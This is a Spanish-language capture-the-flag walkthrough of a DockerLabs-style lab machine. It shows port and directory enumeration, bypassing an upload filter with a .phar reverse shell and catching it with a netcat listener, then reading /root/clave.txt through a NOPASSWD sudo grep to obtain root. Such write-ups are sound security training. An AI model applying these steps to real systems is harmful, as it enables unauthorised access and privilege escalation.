
## Escaneo de puertos:

Como de costumbre vamos a usar **"nmap"** para ver que puertos hay abiertos.
```bash
[14:24:45] bapee@BlumeSec ~/machine ❯ nmap -sCV -p- --open 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-21 14:27 +0200
Nmap scan report for 172.17.0.2
Host is up (0.0000050s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Dockerlabs
MAC Address: 4A:0E:08:ED:72:0C (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.66 seconds
[14:28:08] bapee@BlumeSec ~/machine ❯ 
```

Vemos que el único puerto que hay abierto es el 80, por lo que vamos a entrar a revisarlo y ver que encontramos dentro.

## Análisis del Puerto 80:

Usaremos curl para ver que vemos en la web y asi poder sacar alguna conclusion.
```bash
curl 172.17.0.2
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Dockerlabs</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <input type="text" id="search" placeholder="Busca algo...">
        <select id="difficulty-filter">
            <option value="Todos">Todos</option>
            <option value="Muy fácil">Muy fácil</option>
            <option value="Fácil">Fácil</option>
            <option value="Medio">Medio</option>
            <option value="Difícil">Difícil</option>
        </select>
```

Vemos que es una web donde se almacenan maquinas estilo "**DockerLabs**", asi a simple vista no encontramos nada importante por lo que vamos a proceder a usar "**Gobuster**" para ver si encontramos algo interesante.
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,xml -b 404,403

index.php            (Status: 200) [Size: 8235]
uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
upload.php           (Status: 200) [Size: 0]
machine.php          (Status: 200) [Size: 1361]
```

Vemos que hay directorios interesantes, asi que vamos a empezar a analizarlos.
```bash
[14:37:48] bapee@BlumeSec ~/machine ❯ curl 172.17.0.2/uploads/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /uploads</title>
 </head>
 <body>
<h1>Index of /uploads</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.58 (Ubuntu) Server at 172.17.0.2 Port 80</address>
</body></html>
```
Vemos que es muestra las subidas que han habido, lo que nos indica que tiene que haber un lugar donde subir las maquinas.

```bash
[14:37:50] bapee@BlumeSec ~/machine ❯ curl 172.17.0.2/machine.php/
<!DOCTYPE html>
<html>
<head>
    <title>Upload here your file</title>
</head>
<body> 
    <h2>Upload File</h2>
    <form action="upload.php" method="post" enctype="multipart/form-data">
        <input type="file" name="file" id="file">
        <br>
        <input type="submit" name="submit" value="Upload File">
    </form>
</body>
</html>
[14:39:37] bapee@BlumeSec ~/machine ❯ 
```
Esto ya es interesante, hemos encontrado un lugar donde poder subir las maquinas, por lo que podriamos tratar de subir una **sell .php** para sacar una **Shell** como **www-data**.

## Subir la Shell en Machine.php

Lo primero que hacemos es crear nuestra shell .php en https://www.revshells.com/ , en nuestro caso usaremos la de **"PHP PentestMonkey"**.

Una vez lo tenemos la creamos en nuestra maquina atacante.
```bash
[14:42:17] bapee@BlumeSec ~/machine ❯ nvim shell.php
[14:44:05] bapee@BlumeSec ~/machine ❯ ls
	shell.php
```

Ahora vamos a ir a la web y la vamos a subir.
![[../assets/Pasted image 20260521144729.png]]
![[../assets/Pasted image 20260521144751.png]]

Vemos, que nos ha denegado la subida del archivo porque no es .zip, ahora lo que haremos será usar **burpsuite** para ir probando de manera automática si podemos subir el archivo con diferentes extensiones.

## Modificar la extensión con BurpSuite

**Esta explicación va a ser un poco larga, asi que voy a intentar resumirla lo máximo posible para que se entienda.**

Vamos a empezar a analizar las peticiones con el Proxy>Intercept de burpsuite y una vez este listo le damos a "Upload" dentro de la Web.

Se nos generara una petición, esta la mandaremos al Intruder teniendo la petición seleccionada y pulsando "Ctrl + L".

Dentro del Intruder, tenemos que seleccionar la extension del "**filename**" y una vez sleccionada la marcamos con "**Add**".
![[../assets/Pasted image 20260521145742.png]]

Ahora tenemos que cargar el **Payload**, que será donde metamos el archivo con el que se van a probar diferentes extensiones, en mi caso dejo la captura y la **ruta** que he utilizado.
**```/usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt```** 
![[../assets/Pasted image 20260521145917.png]]

Una vez tenemos esto listo, tenemos que darle al botón naranja en el que pone "**Start Attack**", se nos abrirá un listado de todas las extensiones probadas y tenemos que buscar cual es la que ha funcionado (Código 200).

![[../assets/Pasted image 20260521150522.png]]
Vemos que se ha subido **shell.phar** de manera exitosa, asi que ya podemos cerrar burpsuite y ir a **172.17.0.2/uploads/**
![[../assets/Pasted image 20260521150625.png|598]]

Ahora abriremos en nuestra maquina atacante el puerto 4444 en escucha con el siguiente comando.
```bash
[15:14:53] bapee@BlumeSec ~/machine ❯ nc -lvnp 4444
listening on [any] 4444 ...
```

Una vez esta listo, ejecutamos el archivo **"shell.phar"** dentro de la web dándole click.
```bash
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 36272
Linux 6dfcfa58d580 6.19.14+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.19.14-1+kali1 (2026-05-05) x86_64 x86_64 x86_64 GNU/Linux
 15:15:49 up  2:22,  0 user,  load average: 0.00, 0.08, 0.15
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

Ahora oficialmente hemos conseguido la **shell** como **www-data**, asi que ahora nos ponemos con la escalada de privilegios hasta llegar a **root**.

## Escalada de Privilegios.

Primero que nada nos mejoras la **shell** con los siguientes comandos:
```bash
script /dev/null -c bash <-- "Si pruebas python no funcionara"
stty raw -echo; fg
reset xterm <-- "Justo cuando hagamos el anterior, sin tocar nada mas"
export TERM=xterm
export BASH=bash
```

Una vez dentro, comprobamos permisos **sudo** y **SUID**.
```bash
sudo -l
Matching Defaults entries for www-data on 6dfcfa58d580:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on 6dfcfa58d580:
    (root) NOPASSWD: /usr/bin/cut
    (root) NOPASSWD: /usr/bin/grep
```

Observamos que podemos ejecutar los binarios **cut y grep con privilegios de root**.
Asi que nos ponemos a analizar los directorios del sistema a ver si encontramos algo interesante.
```bash
www-data@6dfcfa58d580:/$ ls
bin   dev  home  lib.usr-is-merged  media  opt	root  sbin  sys  usr
boot  etc  lib	lib64		   mnt    proc  run   srv   tmp  var
www-data@6dfcfa58d580:/$ ls -la home
total 16
drwxr-xr-x 1 root    root    4096 May 17  2024 .
drwxr-xr-x 1 root    root    4096 May 21 14:26 ..
drwxr-x--- 2 dbadmin dbadmin 4096 May 17  2024 dbadmin
drwxr-x--- 2 ubuntu  ubuntu  4096 Apr 29  2024 ubuntu
www-data@6dfcfa58d580:/$ ls -la root
ls: cannot open directory 'root': Permission denied
www-data@6dfcfa58d580:/$ ls -la sys
total 4
dr-xr-xr-x  13 root root    0 May 21 15:25 .
drwxr-xr-x   1 root root 4096 May 21 14:26 ..
drwxrwxrwt   2 root root   40 May 21 14:26 firmware
drwxr-xr-x   9 root root    0 May 21 14:26 fs
drwxr-xr-x   2 root root    0 May 21 15:25 hypervisor
drwxr-xr-x  19 root root    0 May 21 15:25 kernel
drwxr-xr-x 193 root root    0 May 21 15:25 module
drwxr-xr-x   3 root root    0 May 21 15:25 power
www-data@6dfcfa58d580:/$ ls -la opt
total 12
drwxr-xr-x 1 root root 4096 May 17  2024 .
drwxr-xr-x 1 root root 4096 May 21 14:26 ..
-rw-r--r-- 1 root root  129 May 17  2024 nota.txt
```

Hemos encontrado algo dentro de ```opt``` , leámoslo.
```bash
www-data@6dfcfa58d580:/$ cat /opt/nota.txt 
Protege la clave de root, se encuentra en su directorio /root/clave.txt, menos mal que nadie tiene permisos para acceder a ella.
```

Interesante, la contraseña de **root** esta guardada en ```/root/clave.txt```, como podemos ejecutar ```grep``` con sudo, vamos a abusar de eso para leer ```clave.txt```.
```bash
www-data@6dfcfa58d580:/$ sudo /usr/bin/grep "" /root/clave.txt
dockerlabsmolamogollon123
```

Una vez la tenemos, escalamos a **root**.
```bash
www-data@6dfcfa58d580:/$ su root
Password: dockerlabsmolamogollon123
root@6dfcfa58d580:/# whoami
root
root@6dfcfa58d580:/# id
uid=0(root) gid=0(root) groups=0(root)
root@6dfcfa58d580:/# uname -a
Linux 6dfcfa58d580 6.19.14+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.19.14-1+kali1 (2026-05-05) x86_64 x86_64 x86_64 GNU/Linux
root@6dfcfa58d580:/# 
```


## Conclusión del ataque:

### Resumen de la ruta de ataque

La máquina ha sido comprometida completamente mediante una cadena de explotación basada en una vulnerabilidad de subida de archivos, obtención de shell remota y abuso de permisos sudo mal configurados. El recorrido seguido ha sido el siguiente:

- Enumeración inicial → Descubrimiento del puerto **80 (HTTP)** con Apache activo.
- Enumeración web → Uso de `gobuster` para descubrir:
    - `/uploads`
    - `/upload.php`
    - `/machine.php`
- Descubrimiento de funcionalidad vulnerable → Identificación de un panel de subida de archivos en `machine.php`.
- Bypass de restricción de extensiones → Uso de BurpSuite Intruder para fuzzear extensiones permitidas hasta encontrar `.phar` como válida.
- Acceso inicial → Subida y ejecución de una reverse shell `shell.phar`, obteniendo acceso como `www-data`.
- Estabilización de la TTY → Mejora de la shell mediante `script`, `stty` y configuración de entorno interactivo.
- Enumeración local → Revisión de permisos sudo con `sudo -l`.
- Escalada de privilegios → Descubrimiento de permisos `NOPASSWD` sobre:
    - `/usr/bin/cut`
    - `/usr/bin/grep`
- Fuga de información sensible → Lectura de `/opt/nota.txt`, donde se indicaba que la contraseña de root estaba almacenada en: ```/root/clave.txt```
- Abuso de binarios sudo → Uso de `sudo grep` para leer el contenido de `/root/clave.txt`.
- Compromiso total → Obtención de la contraseña de root:
	```dockerlabsmolamogollon123```
- Acceso root → Uso de `su root` para obtener una shell privilegiada y comprometer completamente la máquina.
